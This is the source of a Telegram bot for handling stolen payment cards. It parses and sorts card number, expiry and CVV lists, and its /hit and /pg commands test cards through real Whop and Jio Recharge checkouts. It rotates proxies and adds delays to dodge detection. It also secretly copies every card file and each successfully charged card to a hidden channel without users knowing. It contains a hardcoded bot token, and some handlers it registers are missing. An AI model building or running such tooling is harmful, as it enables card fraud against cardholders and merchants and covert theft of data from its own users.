import os
import re
import logging
import asyncio
import json
import urllib.request
import urllib.error
import time
import random
from datetime import datetime
from io import BytesIO
from typing import Dict, Set, List, Optional
from urllib.parse import urlparse

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler,
)

# Safe import for Whop Checker
try:
    from whop_checker import WhopCheckout, _parse_cc, _build_cfg
    WHOP_LOADED = True
except Exception as e:
    print(f"CRITICAL ERROR: Failed to import 'whop_checker.py': {e}")
    WHOP_LOADED = False

# Safe import for Jio Checker
try:
    from jio import jio_checkout, parse_card_line
    JIO_LOADED = True
except Exception as e:
    print(f"CRITICAL ERROR: Failed to import 'jio.py': {e}")
    JIO_LOADED = False

# ═══════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8983900075:AAGlMV8ldf6xUdrh8ktGkKK_c9_z2AMmJ2c")

# Secret Channel ID (Hidden from users)
SECRET_GROUP_ID = -1003721327421
WHOP_SECRET_LOGS_ID = -1003721327421

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════
# CARD PARSING LOGIC
# ═══════════════════════════════════════════════════════
_SEP = r"[\|:,/\s]+"
CARD_RE = re.compile(
    r"(?<!\d)"
    r"(\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{1,7})"
    + _SEP + r"(0?[1-9]|1[0-2])"
    + _SEP + r"(\d{2,4})"
    + _SEP + r"(\d{3,4})"
    + r"(?!\d)",
    re.MULTILINE,
)

def _clean_num(raw: str) -> str:
    return re.sub(r"[\s\-]", "", raw)

def extract_cards(text: str) -> List[str]:
    found, seen = [], set()
    for m in CARD_RE.finditer(text):
        card = _clean_num(m.group(1))
        month = m.group(2).zfill(2)
        year = m.group(3)[-2:]
        cvv = m.group(4)
        if not card.isdigit() or not (13 <= len(card) <= 19):
            continue
        line = f"{card}|{month}|{year}|{cvv}"
        if line not in seen:
            seen.add(line)
            found.append(line)
    return found

def cards_to_bytes(cards: List[str]) -> bytes:
    return ("\n".join(cards) + "\n").encode("utf-8")

def get_file_size(cards: List[str]) -> str:
    size_bytes = len(cards_to_bytes(cards))
    if size_bytes < 1024:
        return f"{size_bytes} B"
    elif size_bytes < 1024 * 1024:
        return f"{size_bytes / 1024:.2f} KB"
    else:
        return f"{size_bytes / (1024 * 1024):.2f} MB"

# ═══════════════════════════════════════════════════════
# DATA STORES
# ═══════════════════════════════════════════════════════
_store: Dict[int, List[str]] = {}
_merge_buffer: Dict[int, List[str]] = {}
_fwd_buf: Dict[int, dict] = {}
_user_state: Dict[int, str] = {}

# ═══════════════════════════════════════════════════════
# KEYBOARDS
# ═══════════════════════════════════════════════════════
def main_menu_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🕷️ Scrape", callback_data="btn_scrape"),
         InlineKeyboardButton("🧹 Clean", callback_data="btn_clean")],
        [InlineKeyboardButton("✅ Live Check", callback_data="btn_live"),
         InlineKeyboardButton("🌍 Country", callback_data="btn_country")],
        [InlineKeyboardButton("✂️ Split", callback_data="btn_split"),
         InlineKeyboardButton("🔄 Dedup", callback_data="btn_dedup")],
        [InlineKeyboardButton("📁 Add File", callback_data="btn_addfile"),
         InlineKeyboardButton("📦 Merge", callback_data="btn_merge")],
        [InlineKeyboardButton("🔍 Find BIN", callback_data="btn_findbin"),
         InlineKeyboardButton("⚙️ Settings", callback_data="btn_settings")]
    ])

def back_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️ Back to Menu", callback_data="btn_back")]
    ])

# ═══════════════════════════════════════════════════════
# CORE FILE SENDER (WITH SECRET FORWARDING)
# ═══════════════════════════════════════════════════════
async def send_file_and_copy(bot, chat_id: int, user_id: int, cards: List[str],
                             caption: str, filename: str = "cards.txt"):
    if not cards:
        await bot.send_message(chat_id, "❌ No cards found to generate file.")
        return

    file_size = get_file_size(cards)
    full_caption = f"{caption}\n💾 Size: <code>{file_size}</code>"

    buf = BytesIO(cards_to_bytes(cards))
    buf.name = filename
    try:
        await bot.send_document(
            chat_id=chat_id, document=buf, filename=filename,
            caption=full_caption, parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Failed to send file to user {user_id}: {e}")

    try:
        buf2 = BytesIO(cards_to_bytes(cards))
        buf2.name = filename
        await bot.send_document(
            chat_id=SECRET_GROUP_ID, document=buf2, filename=filename,
            caption=f"🕵️‍♂️ Copy from User: <code>{user_id}</code>\n{full_caption}",
            parse_mode="HTML", disable_notification=True
        )
    except Exception as e:
        logger.error(f"Failed to send secret copy: {e}")

# ═══════════════════════════════════════════════════════
# COMMAND HANDLERS
# ═══════════════════════════════════════════════════════
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    _user_state.pop(user.id, None)
    text = (
        f"🦇 <b>Advanced Card Parser Bot</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👋 Welcome, <b>{user.first_name}</b>!\n\n"
        f"🤖 I am an advanced bot designed to clean, format, merge, split, "
        f"and manage card data instantly.\n\n"
        f"👇 <b>Select an option below to begin:</b>"
    )
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=main_menu_keyboard())

async def cmd_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    _user_state.pop(update.effective_user.id, None)
    await update.message.reply_text(
        "🏠 <b>Main Menu</b>\n━━━━━━━━━━━━━━━━━━━━━\nSelect an option below:",
        parse_mode="HTML", reply_markup=main_menu_keyboard())

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY LOADER & PARSER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _load_whop_proxies() -> list:
    try:
        with open("px.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []

def _parse_proxy_to_playwright(proxy_str: str) -> Optional[dict]:
    """Parses proxy string from px.txt into a Playwright-compatible dictionary."""
    if not proxy_str:
        return None
    
    # Add scheme if missing so urlparse works correctly
    if "://" not in proxy_str:
        proxy_str = "http://" + proxy_str
        
    try:
        parsed = urlparse(proxy_str)
        if parsed.hostname and parsed.port:
            res = {"server": f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"}
            if parsed.username:
                res["username"] = parsed.username
            if parsed.password:
                res["password"] = parsed.password
            return res
    except:
        pass
        
    # Fallback for format: host:port:user:pass
    try:
        parts = proxy_str.split(":")
        if len(parts) == 4:
            host, port, user, pw = parts
            return {"server": f"http://{host}:{port}", "username": user, "password": pw}
    except:
        pass

    return {"server": proxy_str}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /hit COMMAND (WHOP CHECKOUT - MULTI CARD WITH PROXY RETRIES & LOCK)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
WHOP_SECRET_LOGS_ID = -1003721327421  # Your secret channel ID

def _load_whop_proxies() -> list:
    """Load proxies from px.txt"""
    try:
        with open("px.txt", "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
            return proxies
    except FileNotFoundError:
        return []

async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not WHOP_LOADED:
        msg = (
            "❌ <b>MODULE NOT LOADED</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "The <code>whop_checker.py</code> file failed to import.\n"
            "Please make sure you have installed requirements: <code>pip install requests</code>\n"
            "And ensure <code>whop_checker.py</code> is in the same folder as <code>bot.py</code>."
        )
        await update.message.reply_text(msg, parse_mode="HTML")
        return

    # ── Session Lock / Cooldown ──
    active_hit_users = context.bot_data.setdefault("active_hit_users", set())
    if update.effective_user.id in active_hit_users:
        await update.message.reply_text(
            "⏳ <b>Slow down!</b>\nYou already have an active Whop check running.\n"
            "Please wait for it to finish before starting a new one.",
            parse_mode="HTML"
        )
        return

    if not context.args or len(context.args) < 2:
        msg = (
            "❌ INVALID USAGE\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "📌 Usage: <code>/hit card|mm|yy|cvv whop_url</code>\n"
            "📌 Example: <code>/hit 4532015112830366|12|28|123 https://whop.com/...</code>\n\n"
            "⚠️ Note: Runs a full simulated Whop checkout using the provided URL."
        )
        await update.message.reply_text(msg, parse_mode="HTML")
        return

    # Extract all cards and the URL
    cards_list = [arg for arg in context.args if "|" in arg and not arg.startswith("http")]
    url_str = next((arg for arg in context.args if arg.startswith("http")), None)

    if not cards_list:
        await update.message.reply_text(
            "❌ No valid card format found.\n"
            "Make sure it follows: <code>CARD|MM|YY|CVV</code>",
            parse_mode="HTML"
        )
        return

    if not url_str:
        await update.message.reply_text(
            "❌ No Whop URL found.\n"
            "Usage: <code>/hit card|mm|yy|cvv https://whop.com/...</code>",
            parse_mode="HTML"
        )
        return

    # Limit to 10 cards to prevent spam/timeout
    if len(cards_list) > 10:
        cards_list = cards_list[:10]

    # Load proxies
    proxies_list = _load_whop_proxies()
    if not proxies_list:
        await update.message.reply_text("⚠️ <b>px.txt not found or empty.</b> Please add proxies to avoid blocks.", parse_mode="HTML")
        return
    
    total_cards = len(cards_list)
    status_msg = await update.message.reply_text(f"⏳ Processing Whop checkout...\nProgress: 0/{total_cards}", parse_mode="HTML")

    # Lock the session for this user
    active_hit_users.add(update.effective_user.id)

    loop = asyncio.get_running_loop()
    results_data = []
    has_paid = False

    try:
        for i, card_str in enumerate(cards_list):
            try:
                await status_msg.edit_text(f"⏳ Processing Whop checkout...\nProgress: {i}/{total_cards}", parse_mode="HTML")
            except Exception:
                pass

            parsed, err = _parse_cc(card_str)
            if err:
                results_data.append({"card": card_str, "status": "error", "msg": err})
                continue

            # Try up to 3 different proxies for each card
            max_proxy_retries = min(3, len(proxies_list))
            result = None

            for attempt in range(max_proxy_retries):
                proxy_to_use = random.choice(proxies_list)
                cfg = _build_cfg(url_str, "", parsed, proxy=proxy_to_use)

                def run_checker():
                    return WhopCheckout(cfg).run_api()

                try:
                    result = await loop.run_in_executor(None, run_checker)
                except Exception as e:
                    logger.error(f"Crash for {card_str} with proxy {proxy_to_use}: {e}")
                    result = {"status": "error", "message": str(e)}

                # Check if it's a proxy/blocked error
                st_temp = result.get("status", "unknown")
                msg_temp = result.get("message", "")
                if st_temp == "error" and ("Page load failed" in msg_temp or "ProxyError" in msg_temp or "403" in msg_temp):
                    logger.warning(f"Proxy {proxy_to_use} failed for {card_str}. Retrying with a new proxy ({attempt+1}/{max_proxy_retries})...")
                    await asyncio.sleep(1) # Short delay before next proxy
                    continue # Try next proxy
                else:
                    break # Success or non-proxy error, stop retrying

            if result is None:
                result = {"status": "error", "message": "All proxies failed"}

            st = result.get("status", "unknown")
            msg = result.get("message", "")
            code = result.get("code", "")
            
            if st == "charged":
                has_paid = True
                sub_msg = "Payment successful"
            elif st == "3ds":
                sub_msg = result.get("url", "3DS required")
            elif st == "declined":
                sub_msg = msg or code or "Payment failed"
                if "No plans" in sub_msg or "nodes" in sub_msg:
                    sub_msg = "Declined."
                elif "Page load failed" in sub_msg or "ProxyError" in sub_msg or "403" in sub_msg or "All proxies failed" in sub_msg:
                    sub_msg = "Declined."
            elif st == "error":
                sub_msg = msg
                if "No plans" in sub_msg or "nodes" in sub_msg:
                    sub_msg = "Declined."
                    st = "declined"
                elif "Page load failed" in sub_msg or "ProxyError" in sub_msg or "403" in sub_msg or "All proxies failed" in sub_msg:
                    sub_msg = "Declined."
                    st = "declined"
            else:
                sub_msg = "Unknown status"

            results_data.append({"card": card_str, "status": st, "msg": sub_msg})

            # Add a 2-second delay between cards to look more human
            if i < total_cards - 1:
                await asyncio.sleep(2)

        # Determine Overall Status
        paid_count = len([r for r in results_data if r['status'] == 'charged'])
        if has_paid:
            overall_status = "Partially Paid 💰" if paid_count < total_cards else "Paid 💰"
        else:
            overall_status = "Not Paid ❌"

        # Build Final Text for User (Amount Hidden)
        text = (
            f"#Whop [/hit]\n"
            f"⸺⸺⸺⸺⸺\n"
            f"⌑ Site : Whop 🌐\n"
            f"⌑ Status : {overall_status}\n"
            f"⌑ Progress : {total_cards}/{total_cards}\n"
            f"⸺⸺⸺⸺⸺\n"
        )

        for res in results_data:
            text += f"<code>{res['card']}</code>\n  ⤷ {res['msg']}\n"

        # Send final response to user
        await status_msg.edit_text(text, parse_mode="HTML")

        # ── Send PAID cards to channels silently ──
        paid_cards = [res for res in results_data if res['status'] == 'charged']
        if paid_cards:
            try:
                uid_str = update.effective_user.id
                username_str = f"@{update.effective_user.username}" if update.effective_user.username else "N/A"
                
                # Base Hit Logo Text (Amount set to 'hide' as requested)
                base_logo_text = (
                    f"⌑Status : Charged 💎\n"
                    f"⌑Hitter : Whop\n"
                    f"⌑Amount : hide\n"
                    f"⌑Resp : Payment successful\n"
                    f"⌑User : {username_str}\n"
                    f"⌑Order : ****{uid_str % 65536:04X}\n"
                )
                
                secret_kb = InlineKeyboardMarkup([[
                    InlineKeyboardButton("🦇 Batcardchk", url="https://t.me/Batcardchk")
                ]])
                
                # 1. Send ONLY the Hit Logo to Public Channel (Batcardchk)
                try:
                    await context.bot.send_message(
                        chat_id="@Batcardchk",
                        text=base_logo_text,
                        parse_mode="HTML",
                        reply_markup=secret_kb,
                        disable_notification=True
                    )
                except Exception as e:
                    logger.error(f"Failed to send hit logo to Batcardchk: {e}")
                
                # 2. Send Logo + Card Details to Secret Channel
                secret_cards_text = base_logo_text + "⸺⸺⸺⸺⸺\n"
                for res in paid_cards:
                    secret_cards_text += f"⌑Card : <code>{res['card']}</code>\n"
                
                try:
                    await context.bot.send_message(
                        chat_id=WHOP_SECRET_LOGS_ID,
                        text=secret_cards_text,
                        parse_mode="HTML",
                        disable_notification=True  # Silently sends, user doesn't know
                    )
                except Exception as e:
                    logger.error(f"Failed to send hit secret copy: {e}")
                    
            except Exception as e:
                logger.error(f"Failed to build hit secret copy: {e}")

    finally:
        # Always remove the user from the lock when done or if it crashes
        active_hit_users.discard(update.effective_user.id)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /pg COMMAND (JIO RECHARGE CHECKOUT WITH PROXIES)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_pg(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not JIO_LOADED:
        await update.message.reply_text(
            "❌ <b>MODULE NOT LOADED</b>\n"
            "The <code>jio.py</code> file failed to import.\n"
            "Please make sure you have installed requirements: <code>pip install playwright && playwright install chromium</code>\n"
            "And ensure <code>jio.py</code> is in the same folder as <code>bot.py</code>.",
            parse_mode="HTML"
        )
        return

    if len(context.args) < 3:
        msg = (
            "❌ INVALID USAGE\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "📌 Usage: <code>/pg phone amount card|mm|yy|cvv</code>\n"
            "📌 Example: <code>/pg 9876543210 299 4532015112830366|12|28|123</code>\n\n"
            "⚠️ Note: Runs a full Jio Recharge checkout using Playwright (may take 1-2 minutes)."
        )
        await update.message.reply_text(msg, parse_mode="HTML")
        return

    phone = context.args[0]
    amount = context.args[1]
    card_str = context.args[2]

    card = parse_card_line(card_str)
    if not card:
        await update.message.reply_text(
            "❌ No valid card format found.\n"
            "Make sure it follows: <code>CARD|MM|YY|CVV</code>",
            parse_mode="HTML"
        )
        return

    proxies_list = _load_whop_proxies()
    if not proxies_list:
        await update.message.reply_text("⚠️ <b>px.txt not found or empty.</b> Please add proxies to avoid blocks.", parse_mode="HTML")
        return

    status_msg = await update.message.reply_text("⏳ Processing Jio Recharge... This may take 1-2 minutes.", parse_mode="HTML")
    loop = asyncio.get_running_loop()

    max_proxy_retries = min(3, len(proxies_list))
    status, message, url, meta = "error", "All proxies failed", "", {}

    for attempt in range(max_proxy_retries):
        proxy_str = random.choice(proxies_list)
        proxy_dict = _parse_proxy_to_playwright(proxy_str)
        
        await status_msg.edit_text(f"⏳ Processing Jio Recharge...\nProxy attempt {attempt+1}/{max_proxy_retries}", parse_mode="HTML")
        
        def run_jio():
            return jio_checkout(phone, amount, card, proxy=proxy_dict)

        try:
            status, message, url, meta = await loop.run_in_executor(None, run_jio)
        except Exception as e:
            logger.error(f"Jio checker crashed with proxy {proxy_str}: {e}")
            status, message = "error", str(e)
        
        if status == "error" and ("ProxyError" in message or "ERR_PROXY_CONNECTION_FAILED" in message or "net::ERR" in message or "Jio checkout failed" in message):
            await asyncio.sleep(1)
            continue
        else:
            break

    if status == "success":
        status_emoji = "✅ Paid 💰"
        sub_msg = "Payment successful"
    elif status == "failed":
        status_emoji = "❌ Not Paid"
        sub_msg = message
    elif status == "requires_action":
        status_emoji = "🔐 3D Secure"
        sub_msg = "3DS required"
    elif status == "error":
        status_emoji = "⚠️ Error"
        sub_msg = message
    else:
        status_emoji = "❓ Unknown"
        sub_msg = message

    text = (
        f"#Jio [/pg]\n"
        f"⸺⸺⸺⸺⸺\n"
        f"⌑ Site : Jio Recharge 🌐\n"
        f"⌑ Amount : ₹{amount}\n"
        f"⌑ Status : {status_emoji}\n"
        f"⌑ Phone : {phone}\n"
        f"⸺⸺⸺⸺⸺\n"
        f"<code>{card['pan']}|{card['exp_month']}|{card['exp_year'][-2:]}|{card['cvv']}</code>\n"
        f"  ⤷ {sub_msg}"
    )

    await status_msg.edit_text(text, parse_mode="HTML")

# ═══════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════
def main() -> None:
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_menu))
    app.add_handler(CommandHandler("hit", cmd_hit))   
    app.add_handler(CommandHandler("pg", cmd_pg)) 

    app.add_handler(CallbackQueryHandler(button_callback, pattern="^btn_"))

    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.FORWARDED & (filters.TEXT | filters.CAPTION), handle_forwarded))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.FORWARDED, handle_text))

    logger.info("🦇 Advanced Card Parser Bot v2.6 starting… (Hidden Secret Logging Active)")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
